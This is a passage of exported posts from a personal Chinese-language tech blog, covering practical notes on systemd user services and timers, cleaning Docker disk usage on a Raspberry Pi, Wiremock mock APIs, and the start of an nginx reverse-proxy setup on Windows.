可用的選項(亦稱\"指令\"或\"屬性\")如下：\n\n參考: [systemd.unit 中文手册 [金步国]](http://www.jinbuguo.com/systemd/systemd.unit.html)\n\n詳細內容:[Systemd 入門教程：實戰篇 - 阮一峰的網絡日誌](https://www.ruanyifeng.com/blog/2016/03/systemd-tutorial-part-two.html) {% asset_link web1.png 備份圖 %}\n\n感覺上面重點都提到了...\n~~我不忍心完整 copy & paste~~沒大握整理好，可以到裡面看!!\n這邊整理我覺得之後可能會用到的\n\n看大多數接學都是用 root 設定 systemd\n**前陣子有看到使用一般 user 操作 systemd**\n本篇重點實作網路案例操作看看\n\n\n## systemctl --user\n\n最近爬到一篇 一般user也可以使用\n一般主機排程都是設定在 root(我之前工作大多數都 這樣)\n但最近在想是不是應該可以切開一個全縣讓工程師去做設定\n畢竟大多數 MIS 也看不懂程式...\n\n### 一般使用者實作\n\n建置一個 Hello-world.service \n\n```bash\nvim ~/.config/systemd/user/hello-world.service \n```\n\n```ini hello-wrold.service\n[Unit]\nDescription=Hello World Service\nAfter=systend-user-sessions.service\n\n[Service]\nType=simple\nExecStart=/home/malagege/hello-world.sh\nSyslogIdentifier=HelloWorldService\n\n[Install]\nWantedBy=default.target\n````\n\n啟用 hello-world.service\n```bash\nsystemctl --user  enable  hello-world.service                                                                                   \nCreated symlink /home/malagege/.config/systemd/user/default.target.wants/hello-world.service → /home/malagege/.config/systemd/user/hello-world.service.\n```\n\n~~竟然不用做 systemctl daemon-reload!!! ~~\n~~**我還實有看到有的教學有用**`systemctl --user daemon-reload`~~\n修改 timer 的時候需要 `systemctl --user daemon-reload` 才會生效\n\n但我這邊沒使用就能用了\n沒出現先enable 就會有了\n\n```\n systemctl --user  status  hello-world.service\n● hello-world.service - Hello World Service\n   Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled)\n   Active: inactive (dead)\nsystemctl --user  start  hello-world.service\n ~/.config/systemd/user \nsystemctl --user  status  hello-world.service\n● hello-world.service - Hello World Service\n   Loaded: loaded (/home/malagege/.config/systemd/user/hello-world.service; enabled; vendor preset: enabled)\n   Active: active (running) since Tue 2020-11-17 23:26:23 CST; 4s ago\n Main PID: 10483 (hello-world.sh)\n   CGroup: /user.slice/user-1000.slice/user@1000.service/hello-world.service\n           ├─10483 /bin/bash /home/malagege/hello-world.sh\n           └─10485 sleep 30\n\n11月 17 23:26:23 malagege-K42JB systemd[1317]: Started Hello World Service.\n```\n\n/home/malagege/.config/systemd/user/default.target.wants 裡面會出現  hello-world.service\n\nsystemctl --user  disable  hello-world.service\n\n成功完成簡單操作\n\n#### 上面案例執行參數小記\n\n```\n# 標準輸出到\nStandardOutput=syslog\n# 標準錯誤輸出到\nStandardError=syslog\n# 設置syslog中log的程序名稱\nSyslogIdentifier=helloexample\n# 設置syslog中log類型\nSyslogFacility=local0\n# 設置syslog中log級別，此處為info\nSyslogLevel=info\n```\nInstall 需要設定\n這邊是網路參考去配置的\n\n參考:  [[Linux] 利用 Systemd 管理應用程式 – 常用指令 | 從入門到放棄](https://exfast.me/2018/11/linux-use-systemd-manage-application-common-instructions/)\n\n## timer \n\n簡單說一下，這邊操作 systemd 的 timer 只有在 user 登入時候才會跑\n所以需要做到開機跑 timer，需要設定 Linux 配置\n**我這邊有測試桌面登入，登出會有問題，但不確定是不是每個 Linux 就會這樣，但 Command Line 模式都很正常**\n下面會提到\n\n### 初始設定\n\n```bash\nloginctl show-user `__user_id__`\n```\n\n要設定\n\n```\nloginctl enable-linger `id -u` # 後面是放使用者名稱 或 id\n```\n\n會出現 \n\n```\n\n...\n...\n...\nLinger=no\n```\n\n`Linger=no `代表沒有啟用\n一般通常不會打開\n這個不打開的話\n只要登出使用者帳號，當下 systemd 的 timer 都不會執行\n~~**這邊要注意!!疑似要用 root 權限設定**~~\n~~像我用一般使用者設定~~\n~~但登出 timer 就沒有繼續跑了...~~\n~~後來嘗試很就，root 設定 loginctl 就成功了~~\n結果後來桌面登出有時候 systemctl --user 還是會中斷...\n\n> 警告： systemd 服務是 沒有 會話的， 它們在 logind 狀態之外運行， 所以不要在 lingering 中啟用自動登陸的功能，這會導致 會話中斷。\n\n參考:[systemd (簡體中文)/User (簡體中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)/User_(%E7%AE%80%E4%BD%93%E4%B8%AD%E6%96%87)#%E9%9A%8F%E7%B3%BB%E7%BB%9F%E8%87%AA%E5%8A%A8%E5%90%AF%E5%8A%A8systemd%E7%94%A8%E6%88%B7%E5%AE%9E%E4%BE%8B)\n\n用別的使用者下`ps -fu _user_`就可以看到有沒有起 `systemd --user`\n\n有很大機率是這個原因...，不過不知道是我的 ElementaryOS 關係\n顯示自動開啟不是很正確，有時候桌面登出還是會中斷 systemd \n有空我再用樹梅派實體機器測試...\n\n**目前猜測用桌面登出會中斷 systemd**\nPS: 我使用的是 ElementaryOS\n\n- [settings - How to enable automatic login after installing elementary OS Loki - elementary OS Stack Exchange](https://elementaryos.stackexchange.com/questions/7726/how-to-enable-automatic-login-after-installing-elementary-os-loki)\n- [systemd - How to apply lingering immedeately - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/462845/how-to-apply-lingering-immedeately)\n- [用 systemd 管理 laravel 队列和定时任务 - fairycat](https://blog.fairycat.cn/post/128)\n\n## 操作紀錄\n\n參考: [systemd timer：取代cron和at的定时任务 | 骏马金龙](https://www.junmajinlong.com/linux/systemd/systemd_timer/#systemd-timer%E5%85%A5%E9%97%A8%E7%A4%BA%E4%BE%8B%EF%BC%9A%E6%AF%8F3%E7%A7%92%E8%BF%90%E8%A1%8C%E4%B8%80%E6%AC%A1)\n\n\n```ini hello-timer.service\n[Unit]\nDescription = \"Hello Timer Description\"\n\n[Service]\nExecStart = /home/malagege/hello-timer.sh\n# ExecStart = /usr/bin/curl -s -o /dev/null -w '%{http_code}' 'https://www.junmajinlong.com'\n```\n\n```ini hello-timer.timer\n[Unit]\nDescription = \"run hello timer  every 3 seconds\"\n\n[Timer]\nOnActiveSec = 1s\nOnUnitInactiveSec = 3s\nAccuracySec = 1us\nRandomizedDelaySec = 0\n\n[Install]\nWantedBy = timers.target\n\n```\n\n```\nsystemctl --user  start  hello-timer.timer\n```\n\n```\nsystemctl --user list-timers --all\nNEXT                         LEFT    LAST                         PASSED UNIT              ACTIVATES\nWed 2020-11-18 00:05:38 CST  1s left Wed 2020-11-18 00:05:35 CST  1s ago hello-timer.timer hello-timer.service\n```\n\n\n```\nsystemctl --user status  hello-timer.timer\n● hello-timer.timer - \"run hello timer  every 3 seconds\"\n   Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.timer; enabled; vendor preset: enabled)\n   Active: active (waiting) since Wed 2020-11-18 00:03:25 CST; 9min ago\n  Trigger: Wed 2020-11-18 00:13:15 CST; 825ms left\n\n11月 18 00:03:25 malagege-K42JB systemd[1317]: Started \"run hello timer  every 3 seconds\".\n ~/.config/systemd/user \nsystemctl --user status  hello-timer.service\n● hello-timer.service - \"Hello Timer Description\"\n   Loaded: loaded (/home/malagege/.config/systemd/user/hello-timer.service; static; vendor preset: enabled)\n   Active: inactive (dead) since Wed 2020-11-18 00:13:18 CST; 2s ago\n  Process: 20922 ExecStart=/home/malagege/hello-timer.sh (code=exited, status=0/SUCCESS)\n Main PID: 20922 (code=exited, status=0/SUCCESS)\n\n11月 18 00:13:18 malagege-K42JB systemd[1317]: Started \"Hello Timer Description\".\n11月 18 00:13:18 malagege-K42JB hello-timer.sh[20922]: hello world\n```\n\n很有趣的是 hello-timer.service 裡面狀態是static \n不太確定是 .timer 影響到他\n\n\n查看 log \n\n```\njournalctl --user -u hello-timer.service\n```\n\n### 動態延遲執行\n\n```\n# 定時器啟動後，再過10分鐘第一次觸發定時任務\nOnActiveSec=10m\n# 每次執行完任務後，再過15分鐘後再次觸發定時任務\nOnUnitInactiveSec=15m\n# 觸發事件後，允許推遲0-10分鐘再執行被觸發的任務\nAccuracySec=10m\n```\n\n> 以上指令的效果是：\n> \n>  -   啟動定時器後的10m-20m內的任一時間點觸發第一次定時任務\n>  -  之後每隔15m-25m再次觸發定時任務 \n\n\n作者: 骏马金龙\n链接: https://www.junmajinlong.com/linux/systemd/systemd_timer/\n来源: 骏马金龙\n著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。\n\n\n分開看指令，可能不是很了解\nOnUnitInactiveSec 排程執行完之後會執行 service\nAccuracySec 會增加起排程時間\n所以才會變成 15~25 分鐘執行\n\n> AccuracySec的默認值為1分鐘，所以如果不定義AccuracySec的話，即使用戶期待的是每秒觸發一次定時任務，但事實卻是會在1s-61s時間段內的一個隨機時間點觸發一次定時任務。(可以自己去觀察一下定時任務執行情況)\n> \n> 但是，觸發定時任務的時間點並不表示這是執行任務的時間點。觸發了定時任務，還需要根據RandomizedDelaySec的值來決定何時執行定時任務。\n> \n> RandomizedDelaySec指定觸發定時任務後還需延遲一個指定範圍內的隨機時長才執行任務。該指令默認值為0，表示觸發後立即執行任務。\n> \n> 使用RandomizedDelaySec，主要是為了在一個時間範圍內分散大量被同時觸發的定時任務，從而避免這些定時任務集中在同一時間點執行而CPU爭搶。\n> \n> 可見，AccuracySec和RandomizedDelaySec的目的是相反的：\n> \n>     前者讓指定範圍內的定時器集中在同一個時間點一次性觸發它們的定時任務\n>     後者讓觸發的、將要被執行的任務均勻分散在一個時間段範圍內\n> \n> 根據以上描述，如果用戶想要讓定時任務非常精確度地執行，需要將它們設置的足夠小。例如：\n> \n> ```\n> AccuracySec = 1ms        # 定時器到點就觸發定時任務\n> RandomizedDelaySec = 0   # 定時任務一觸發就立刻執行任務\n> ```\n\n我的感覺選 AccuracySec 應該會比較好\n\n### 運行級別(別打錯)\n\n\n[systemd時代的運行級別 | 駿馬金龍](https://www.junmajinlong.com/linux/systemd/runlevel/)\n\n總之設定 Install 的 target \ntimers.target 設定成timer.target\n開機進然不會啟動\n後來發現少加了s \n\n\n### 查看systemd排程時間點\n\n```\nsystemctl list-timers --no-pager\n```\n\n> NEXT表示下一次要觸發定時任務的時間點\n> LEFT表示現在距離下次執行任務還剩多長時間(已經確定了下一次執行的時間點)，或者顯示最近一次執行任務已經過去了多長時間(還不確定下一次執行的時間點)> ，稍後解釋了AccuracySec和RandomizedDelaySec就知道為什麼會有這兩種表示方式\n> LAST表示上次觸發定時任務的時間點\n> PASSED表示距離上一次執行任務已經過去多久\n> UNIT表示是哪個定時器\n> ACTIVATES表示該定時器所觸發的任務 \n\n### 查看日誌\n\n```\n# 查看指定服務的所有journal日誌信息\n# xxx.service是定時任務的名稱\njournalctl -u xxx.service\n\n# 實時監控尾部日誌，類似tail -f\njournalctl -f -u xxx.service\n\n# 顯示指定時間段內的日誌\n# --since：從指定時間點內開始的日誌\n# --until：到指定時間點為止的日誌\njournalctl -u xxx.service --since=\"2020-07-04 19:06:23\"\njournalctl -u xxx.service --since=\"60s ago\"\njournalctl -u xxx.service --since=\"1min ago\"\njournalctl -u page_test.service --since=\"-60s\"\n```\n\n\n\n### Calendar\n\n#### 一般時間執行\n\n全部參考:[systemd timer：取代cron和at的定时任务 | 骏马金龙](https://www.junmajinlong.com/linux/systemd/systemd_timer/#%E6%9B%B4%E4%B8%BA%E7%81%B5%E6%B4%BB%E7%9A%84%E5%AE%9A%E6%97%B6%E8%A7%84%E5%88%99%EF%BC%9AOnCalendar)\n裡面內容豐富，建議看裡面內文\n\n這邊貼範例\n看範例修改就真的很方便\n\n```\n# 假如今日是2012-11-23\n  Fri 2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13\n      2012-11-23 11:12:13 → Fri 2012-11-23 11:12:13\n  2012-11-23 11:12:13 UTC → Fri 2012-11-23 19:12:13\n               2012-11-23 → Fri 2012-11-23 00:00:00\n                 12-11-23 → Fri 2012-11-23 00:00:00\n                 11:12:13 → Fri 2012-11-23 11:12:13\n                    11:12 → Fri 2012-11-23 11:12:00\n                      now → Fri 2012-11-23 18:15:22\n                    today → Fri 2012-11-23 00:00:00\n                today UTC → Fri 2012-11-23 16:00:00\n                yesterday → Fri 2012-11-22 00:00:00\n                 tomorrow → Fri 2012-11-24 00:00:00\n                 +3h30min → Fri 2012-11-23 21:45:22\n                      -5s → Fri 2012-11-23 18:15:17\n                11min ago → Fri 2012-11-23 18:04:22\n      2 months 5 days ago\n              @1395716396 → Tue 2014-03-25 03:59:56\n```\n\n進階使用\n```\nSat,Mon..Wed   -> 周一、二、三、四\n*:00           -> 每小时，省略秒位\n*:*            -> 每分钟，省略秒位\n*:*:*          -> 每秒\n*-*-01 00:00   -> 每月一号，省略秒位\n*-02~03        -> 表示2月的倒数第三天  \n*-05~07/1      -> 表示5月最后7天中的每一天\n*-05~1..7      -> 同上\nMon *-05~07/1  -> 表示5月最后一个星期一\n*:*:3.33/10.05 -> 小数表示秒。3.33,13.38,23.43,33.48,43.53\n9..17/2:00     -> 从上午9点开始每隔两小时，直到下午5点\n12..14:10,20   -> 12到14点的第10分钟和第20分钟，即1[234]:[12]0:00\n```\n\n連月底跟09~17每隔兩小時執行都可以做到\n\n```\nSat,Mon..Wed   -> 週一、二、三、四\n*:00           -> 每小時，省略秒位\n*:*            -> 每分鐘，省略秒位\n*:*:*          -> 每秒\n*-*-01 00:00   -> 每月一號，省略秒位\n*-02~03        -> 表示2月的倒數第三天  \n*-05~07/1      -> 表示5月最後7天中的每一天\n*-05~1..7      -> 同上\nMon *-05~07/1  -> 表示5月最後一個星期一\n*:*:3.33/10.05 -> 小數表示秒。3.33,13.38,23.43,33.48,43.53\n9..17/2:00     -> 從上午9點開始每隔兩小時，直到下午5點\n12..14:10,20   -> 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00\n\n```\n\n\n```\nSat,Mon..Wed   -> 週一、二、三、四\n*:00           -> 每小時，省略秒位\n*:*            -> 每分鐘，省略秒位\n*:*:*          -> 每秒\n*-*-01 00:00   -> 每月一號，省略秒位\n*-02~03        -> 表示2月的倒數第三天  \n*-05~07/1      -> 表示5月最後7天中的每一天\n*-05~1..7      -> 同上\nMon *-05~07/1  -> 表示5月最後一個星期一\n*:*:3.33/10.05 -> 小數表示秒。3.33,13.38,23.43,33.48,43.53\n9..17/2:00     -> 從上午9點開始每隔兩小時，直到下午5點\n12..14:10,20   -> 12到14點的第10分鐘和第20分鐘，即1[234]:[12]0:00\n```\n##### 快速分析工具\n\n```\nsystemd-analyze calendar \"*:*:00\"  \n Original form: *:*:00\nNormalized form: *-*-* *:*:00\n    Next elapse: Sat 2020-11-21 00:01:00 CST\n       (in UTC): Fri 2020-11-20 16:01:00 UTC\n       From now: 24s left\n```\n後面放時間，可以看到內容\n\n#### 月底執行\n\n在還沒整理上面，有特別先找的\n\n之前就有記過[排程 crontab 時間設定月底執行方法 | 程式狂想筆記](https://malagege.github.io/blog/2019/08/04/%E6%8E%92%E7%A8%8B-crontab-%E6%99%82%E9%96%93%E8%A8%AD%E5%AE%9A%E6%9C%88%E5%BA%95%E5%9F%B7%E8%A1%8C%E6%96%B9%E6%B3%95/)\n在想這個有沒有比較優的方法\n\n```\nAs of version 233, systemd supports using \"~\" in its calendar syntax to specify dates relative to the end of the month.\n\nOnCalendar=*-02~03 means the third last day in February (the 26th or 27th, depending on whether or not it's a leap year)\n\nMon *-05~07/1 and Mon *-05~01..07 are synonyms for the last Monday in May.\n\nhttps://github.com/systemd/systemd/blob/v233/NEWS#L174\n\n```\n[How to configure Systemd Timer to run the service on last day of the month - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/306336/how-to-configure-systemd-timer-to-run-the-service-on-last-day-of-the-month)\n\n\n#### 持久化\n\n**Timer**段中還可以使用Unit指令和Persistent指令。\n\n- Unit=xxx.service：默認情況下，a.timer對應要執行的任務文件是a.service，使用Unit指令可以明確指定觸發定時任務事件時要執行的文件\n- Persistent=yes/no：只在使用了OnCalendar時有效，默認值no。設置yes時，會將上次執行任務的時間點保存在磁盤上，使得定時器再次被啟動時，可以立即判斷是否要執行丟失的任務 \n\n有間單測試，我以為設定`*:*:00` 超過三分鐘會執行三次，但是不會...\n\ntimer\n\n```ini \n[Unit]\nDescription = user login timer\n\n[Timer]\nAccuracySec = 1ms\nRandomizedDelaySec = 0\nOnCalendar = *:*:00\nPersistent = yes\n\n[Install]\nWantedBy = timers.target\n```\nservice\n\n```\n[Unit]\nDescription = current time when task is been executed\n\n[Service]\nExecStart = /bin/bash -c 'date +\"%%T\" >>/home/malagege/a.log'\n```\n\n\n## socket 觸發啟動\n\n[Node 应用的 Systemd 启动 - 阮一峰的网络日志](http://www.ruanyifeng.com/blog/2016/03/node-systemd-tutorial.html)\n\n這裡面有介紹\n還覺得滿有趣的\n但目前我這邊應該用不到這個功能\n\n## 搜尋相關文章\n\n### 詳細教學文章\n\n* [systemd (正體中文) - ArchWiki](https://wiki.archlinux.org/index.php/Systemd_(%E6%AD%A3%E9%AB%94%E4%B8%AD%E6%96%87))\n* [使用 systemd.timer 代替 crontab | C瓜農場](https://cfarm.blog.aznc.cc/%E4%BD%BF%E7%94%A8-systemd-timer-%E4%BB%A3%E6%9B%BF-crontab/)\n* [使用 systemd timer 替换 crontab | Yiran's Blog](https://zdyxry.github.io/2018/06/28/%E4%BD%BF%E7%94%A8-systemd-timer-%E6%9B%BF%E6%8D%A2-crontab/)\n* [systemd時代的運行級別 | 駿馬金龍](https://www.junmajinlong.com/linux/systemd/runlevel/) {% asset_link web2.png 備份圖 %}\n[systemd timer：取代cron和at的定时任务 | 骏马金龙](https://www.junmajinlong.com/linux/systemd/systemd_timer/) {% asset_link web3.png 備份圖 %}\n* [Linux Systemd 詳細介紹: Unit、Unit File、Systemctl、Target | 3C](https://www.3chy2.com.tw/3c%E8%B3%87%E8%A8%8A/linux-systemd-%E8%A9%B3%E7%B4%B0%E4%BB%8B%E7%B4%B9-unit%E3%80%81unit-file%E3%80%81systemctl%E3%80%81target/) {% asset_link web4.png 備份圖 %}\n* [Linux系列文章 | 骏马金龙](https://www.junmajinlong.com/linux/index/#systemd)\n\n### 與supervisor 差異\n\n* [systemd vs supervisord_spacewander - SegmentFault 思否](https://segmentfault.com/a/1190000009338835)\n* [Systemd Supervisord 肤浅对比](https://liqiang.io/post/systemd-vs-supervisord)\n* [systemd 和 supervisor 相比各有哪些优缺点？以及各自的适用场景是什么？ - 知乎](https://www.zhihu.com/question/48833333)\n\n之前分不清楚systemd 和 supervisor \n最後看教學，一個是系統層級的、一個是應用層級的\n最後還是決定學好 systemd\n\n不過後來發現 timer 相關設定 supervisor 沒有相關設定\n\n### 跟 docker 差異\n\n* [Systemd与Docker的爱恨情仇 - DockOne.io](http://dockone.io/article/1093)\n* [使用 systemd 管理 Docker container](https://blog.davy.tw/posts/use-systemd-to-manage-docker-container/)\n\n之前有改想過systemd 管理docker 排程，但好像不建議這樣做...\n\n\n### Failed to connect to bus: No such file or directory\"\n\n我們公司環境沒版法使用 `systemctl --user`\n不知道是不是沒有 D-Bus關係\n以下文章都嘗試過，還是沒辦法使用\n\n* [linux - systemctl --use Failed to connect to bus: No such file or directory Debian 9 - Super User](https://superuser.com/questions/1561076/systemctl-use-failed-to-connect-to-bus-no-such-file-or-directory-debian-9)\n* [systemd user \"Failed to connect to bus: No such file or directory\"](https://gist.github.com/Cretezy/dc64ed4519c63c3eb636fba354f93a1f)\n\n* [docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客](https://blog.csdn.net/tengdazhang770960436/article/details/78873869)\n* [docker centos 使用 systemctl Failed to get D-Bus connection: Operation not permitted_彻底拆分，一切可控！-CSDN博客](https://blog.csdn.net/tengdazhang770960436/article/details/78873869)\n\n\nXDG_RUNTIME_DIR=/run/user/`id -u`\n~~建立資料夾??~~沒有用\nhttps://answers.launchpad.net/ubuntu/+source/systemd/+question/287454\n\nXDG_RUNTIME_DIR=/run/user/$UID systemctl --user status\n我電腦 ElementaryOS 新家的參數\n\n### 其他參數\n\n#### work dir\n[Trying to change WorkingDirectory of Systemd Service Unit | DigitalOcean](https://www.digitalocean.com/community/questions/trying-to-change-workingdirectory-of-systemd-service-unit)\n```\nWorkingDirectory=/home/pi\nExecStart=/home/pi/launchscript.sh\n```\nExecStart 必須要完整路徑\n\n#### timeout\n\n[centos - How to change systemd service timeout value? - Unix & Linux Stack Exchange](https://unix.stackexchange.com/questions/227017/how-to-change-systemd-service-timeout-value)\n\n>TimeoutStartSec=\n\n>    設置該服務允許的最大啟動時長。 如果守護進程未能在限定的時長內發出\"啟動完畢\"的信號，那麼該服務將被視為啟動失敗，並會被關閉。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為\"20\"等價於設為\"20s\"。 設為 \"infinity\" 則表示永不超時。 當 Type=oneshot 時， 默認值為 \"infinity\" (永不超時)， 否則默認值等於 DefaultTimeoutStartSec= 的值(參見 systemd-system.conf(5) 手冊)。\n\n>    如果一個 Type=notify 服務發送了 \"EXTEND_TIMEOUT_USEC=…\" 信號， 那麼允許的啟動時長將會在 TimeoutStartSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStartSec= 用完之前發出第一個延時信號。當啟動時間超出 TimeoutStartSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 \"EXTEND_TIMEOUT_USEC=…\" 信號， 直到完成啟動(發送 \"READY=1\" 信號)。詳見 sd_notify(3) 手冊。 \n>TimeoutStopSec=\n\n>    此選項有兩個用途： (1)設置每個 ExecStop= 的超時時長。如果其中之一超時， 那麼所有後繼的 ExecStop= 都會被取消，並且該服務也會被 SIGTERM 信號強制關閉。 如果該服務沒有設置 ExecStop= ，那麼該服務將會立即被 SIGTERM 信號強制關閉。 (2)設置該服務自身停止的超時時長。如果超時，那麼該服務將會立即被 SIGTERM 信號強制關閉(參見 systemd.kill(5) 手冊中的 KillMode= 選項)。 如果未指定時間單位，那麼將視為以秒為單位。 例如設為\"20\"等價於設為\"20s\"。 設為 \"infinity\" 則表示永不超時。 默認值等於 DefaultTimeoutStopSec= 的值(參見 systemd-system.conf(5) 手冊)。\n\n>    如果一個 Type=notify 服務發送了 \"EXTEND_TIMEOUT_USEC=…\" 信號， 那麼允許的停止時長將會在 TimeoutStopSec= 基礎上繼續延長指定的時長。 注意，必須在 TimeoutStopSec= 用完之前發出第一個延時信號。當停止時間超出 TimeoutStopSec= 之後，該服務可以在維持始終不超時的前提下，不斷重複發送 \"EXTEND_TIMEOUT_USEC=…\" 信號，直到完成停止。 詳見 sd_notify(3) 手冊。 \n\n[systemd.service 中文手冊 [金步國]](http://www.jinbuguo.com/systemd/systemd.service.html)\n\n## Supervisor\n\n[Ubuntu下Supervisor安裝、配置和使用 | 程式前沿](https://codertw.com/%E4%BC%BA%E6%9C%8D%E5%99%A8/170578/)\n日後看情況再研究\n有看到 golang 版本\n假如沒有權限可以考慮\n但發現好像沒有 crontab 東西\n\n不繼續研究了....\n\n## 總結\n\n不專業總結\n網路上有很多都寫得很詳細\n建議看網路上詳細\n本篇重點在筆記\n\n\n網路上沒什麼看到 systemd 搭配 docker 裡面跑\n感覺 supervisor 真的比較多\n但我覺得排程這個東西有必要做虛擬化跑?這個也是個問題\n\n用 crond 和 systemd 這個問題也是一個問題\n目前我待過三家公司都是用 crond 居多\n但用 crond 必須控制分散程式執行時間\n有了 systemd ，工程師不用做複雜設計就可以使用\n前提要會操作，所以進入門檻稍微高一點\n\n不知道這些 systemd 有沒有辦法紀錄到 elk 上面\n但我覺得這之後有空再研究\n畢竟我還不會用XD","tags":["crontab"],"categories":["Linux"]},{"title":"Docker 使用容量撐爆 Raspberry PI 硬碟空間","url":"%2Fblog%2F2020%2F11%2F25%2FDocker-%E4%BD%BF%E7%94%A8%E5%AE%B9%E9%87%8F%E6%92%90%E7%88%86-Raspberry-PI-%E7%A1%AC%E7%A2%9F%E7%A9%BA%E9%96%93%2F","content":"\n使用 Docker 我們知道rm container 所有東西不會被保留\n但我往往會忽略有 images 占空間\n我發現 PI 1 已經吃 14GB (總共空間 15GB)\n後來發現是裝太多 images\n原因是我往往先丟 PI 1 測試能不能跑\n日積月累爆掉\nPS: 是更新 apt upgrade 才發現   哈哈\n\n<!--more-->\n\n## 尋找所占目錄空間方法\n\n參考: [Linux - 找出佔用磁碟空間最大的目錄/檔案](http://blog.ilc.edu.tw/blog/index.php?op=printView&articleId=581867&blogId=25793)\n\n```sh\ndu -hsx /home/* | sort -hr | head\n```\n\n這個好處能找到外面層所占目錄\n可以慢慢跑裡面哪一個資料夾吃大空間\n\n最後改成當下執行目錄前大空間大小\n\n```sh\ndu -hsx ./* | sort -hr | head\n```\n\n找到 docker\n\n其實 df 就能看到是 /lib/docker/overlay/...\n\n## docker 清除空間\n\n以下參考整理\n- [Docker:我們的硬盤空間去哪了？ - 知乎](https://zhuanlan.zhihu.com/p/36956285)\n- [Docker 空間使用分析與清理-阿里雲開發者社區](https://developer.aliyun.com/article/272173)\n- [如何清理Docker占用的磁盘空间? | Fundebug博客 - 一行代码搞定BUG监控 - 网站错误监控|JS错误监控|资源加载错误|网络请求错误|小程序错误监控|Java异常监控|监控报警|Source Map|用户行为|可视化重现](https://blog.fundebug.com/2018/01/10/how-to-clean-docker-disk/)\n\n### 確認所占空間\n\n\n```sh\ndocker system df\n\nImages              22                  6                   4.827GB             3.517GB (72%)\nContainers          6                   4                   93.54MB             8.661MB (9%)\nLocal Volumes       3                   1                   214.6kB             66.34kB (30%)\nBuild Cache         0                   0                   0B                  0B\n\n# 詳細資訊\ndocker system df -v\n# 可以看更詳細資訊...\n```\n\n\n### 手動清除\n\n```sh\n# 刪除所有關閉的容器\n\ndocker ps -a | grep Exit | cut -d ' ' -f 1 | xargs docker rm\n\n# 刪除所有 dangling 鏡像(即無 tag 的鏡像)：\n\ndocker rmi $(docker images | grep \"^<none>\" | awk \"{print $3}\")\n\n# 刪除所有 dangling 數據卷(即無用的 volume)：\n\ndocker volume rm $(docker volume ls -qf dangling=true)\n```\n\n這邊有更快清除方法\n\n```\ndocker system prune\n```\n\n\n\n>    Tips ：\n\n>    不同狀態的鏡像\n\n>        已使用鏡像（used image）： 指所有已被容器（包括已停止的）關聯的鏡像。即 docker ps -a 看到的所有容器使用的鏡像。\n>        未引用鏡像（unreferenced image）：沒有被分配或使用在容器中的鏡像，但它有 Tag 信息。\n>        懸空鏡像（dangling image）：未配置任何 Tag （也就無法被引用）的鏡像，所以懸空。這通常是由於鏡像 build 的時候沒有指定 -t 參數配置 Tag 導致的。比如:\n\n>REPOSITORY                                                   TAG                 IMAGE ID            CREATED             SIZE\n> < none >                                                      <none>              6ad733544a63        5 days ago          1.13 MB   > # 懸空鏡像（dangling image）\n>    掛起的卷（dangling Volume)\n>    類似的，dangling=true 的 Volume 表示沒有被任何容器引用的卷。\n\ndocker system prune 自動清理說明：\n\n該指令默認會清除所有如下資源：\n    已停止的容器（container）\n    未被任何容器所使用的卷（volume）\n    未被任何容器所關聯的網絡（network）\n    所有懸空鏡像（image）。\n該指令默認只會清除懸空鏡像，未被使用的鏡像不會被刪除。\n添加 -a 或 --all 參數後，可以一併清除所有未使用的鏡像和懸空鏡像。\n可以添加 -f 或 --force 參數用以忽略相關告警確認信息。\n指令結尾處會顯示總計清理釋放的空間大小。\n\n\n\n以上指令沒有清除到空間，但加了 -a 就清除掉了\n~~可以做 apt upgrade 了~~\n```\ndocker system prune -a\n```\n\n有空再整理什麼是 懸空鏡像 東西... 跟 docker log 處理","tags":["docker"],"categories":["Docker"]},{"title":"使用 Wiremock 搭建 mockapi","url":"%2Fblog%2F2020%2F11%2F24%2F%E4%BD%BF%E7%94%A8-Wiremock-%E6%90%AD%E5%BB%BA-mockapi%2F","content":"\n之前有使用[vscode套件Rest Client搭配JSON-Server簡單使用小記 | 程式狂想筆記](https://malagege.github.io/blog/2018/09/25/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/)\n但我覺得設定還不是很好用\n\n<!--more-->\n\n有找到 Wiremock \n他 router 跟 sample data json 是分開的\n設定上我覺得非常快速\n不會設定錯\n\n> git clone https://github.com/timmyBeef/mock-api.git\n\n[使用 Wiremock mock api (假造 api) - TimmyBeef's Blog](https://timmybeef.github.io/2019/09/20/wiremock/) {% asset_link web.png 備份圖 %}\n裡面介紹很清楚\n看作者裡面內容吧","tags":["mockapi"],"categories":["實用軟體"]},{"title":"快速搭建 web 反向代理 server","url":"%2Fblog%2F2020%2F11%2F24%2F%E5%BF%AB%E9%80%9F%E6%90%AD%E5%BB%BA-web-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86-server%2F","content":"\n之前有聽過 apache, nginx, frp, caddy server 都能做 web 反向代理\n但都沒有實際工作用到\n最近因為有搭建 mockapi 和 jboss 想對外測試line webhook\n有想到代理對外窗口使用 ngrok\n但...反向代理花了不少時間\n希望下次複製及所用\n這邊應該會以window 環境\n畢竟公司開發環境是 window\n\n<!--more-->\n\n之前有設定過 caddy server 1.0\n反向代理非常好設定\n但是從 caddy server 2.0 設定檔完全不會設定\n然後 http => https 強制\n相關都關不掉，找不到取消方法\n只能乖乖用回其他工具\n\n## nginx(方便好設定)\n\n### nginx (window)\n\nnginx 有 window 免安裝 zip\n\n```bat\n# 啟動 nginx\nstart nginx\n# 關閉 nginx\n ./nginx.exe -s stop\n```\n\n### 反向代理設定\n\n\n\n```conf\nserver{\n    listen 80;\n    # server_name 沒設定localhost 的話，只有 127.0.0.1 連的到\n    server_name localhost;\n    location /mockapi/ {\n       \n        # 後端的 Web Server, 即真實伺服器:\n        proxy_pass http://127.0.0.1:8081/;\n \n    